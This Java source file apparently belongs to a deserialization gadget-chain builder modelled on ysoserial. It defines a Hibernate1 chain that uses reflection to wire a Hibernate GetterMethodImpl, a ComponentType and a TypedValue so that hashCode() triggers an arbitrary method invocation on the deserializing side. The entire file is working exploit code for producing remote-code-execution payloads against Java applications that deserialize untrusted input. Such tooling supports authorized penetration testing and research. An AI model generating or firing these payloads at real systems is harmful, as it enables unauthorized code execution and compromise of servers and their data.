package org.ses.gadgetbuilder.chains1;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

import org.hibernate.engine.spi.TypedValue;
import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.AbstractType;
import org.hibernate.type.ComponentType;
import org.hibernate.type.Type;

import org.ses.gadgetbuilder.adapters.MethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.HashCodeTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

@Authors({ Authors.MBECHLER })
@Dependencies({"org.hibernate:hibernate-core:5.0.7.Final", "aopalliance:aopalliance:1.0", "org.jboss.logging:jboss-logging:3.3.0.Final",
        "javax.transaction:javax.transaction-api:1.2"})
@Impact(Impact.MethodInvoke)
public class Hibernate1 extends MethodInvokeGadgetChain<HashCodeTrampoline, MethodInvokeAdapter> {
    public Hibernate1(HashCodeTrampoline _trampoline, MethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        Object payload = this.methodInvokeAdapter.getInvocationTarget(command);

        Class<?> getterIf = Class.forName("org.hibernate.property.access.spi.Getter");
        Class<?> basicGetter = Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");

        Method method;
        try {
            method = payload.getClass().getDeclaredMethod(this.methodInvokeAdapter.getMethodName());
        } catch (NoSuchMethodException e) {
            method = payload.getClass().getMethod(this.methodInvokeAdapter.getMethodName());
        }

        Constructor<?> bgCon = basicGetter.getConstructor(Class.class, String.class, Method.class);
        Object g = bgCon.newInstance(payload.getClass(), "test", method);
        Object getters = Array.newInstance(getterIf, 1);
        Array.set(getters, 0, g);

        PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
        Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);


        ComponentType t = Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
        Reflections.setFieldValue(t, "componentTuplizer", tup);
        Reflections.setFieldValue(t, "propertySpan", 1);
        Reflections.setFieldValue(t, "propertyTypes", new Type[] {
                t
        });

        TypedValue v1 = new TypedValue(t, null);
        Reflections.setFieldValue(v1, "value", payload);
        Reflections.setFieldValue(v1, "type", t);

        TypedValue v2 = new TypedValue(t, null);
        Reflections.setFieldValue(v2, "value", payload);
        Reflections.setFieldValue(v2, "type", t);

        return new TrampolineConnector(v1);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "org.hibernate.engine.spi.TypedValue.hashCode()\n" +
                "org.hibernate.internal.util.ValueHolder.getValue()\n" +
                "org.hibernate.engine.spi.TypedValue$1.initialize()\n" +
                "org.hibernate.engine.spi.TypedValue$1.initialize()\n" +
                "org.hibernate.type.ComponentType.getHashCode()\n" +
                "org.hibernate.type.ComponentType.getPropertyValue()\n" +
                "org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()\n" +
                "org.hibernate.property.access.spi.GetterMethodImpl.get()\n" +
                "java.lang.reflect.Method.invoke()";
    }
}
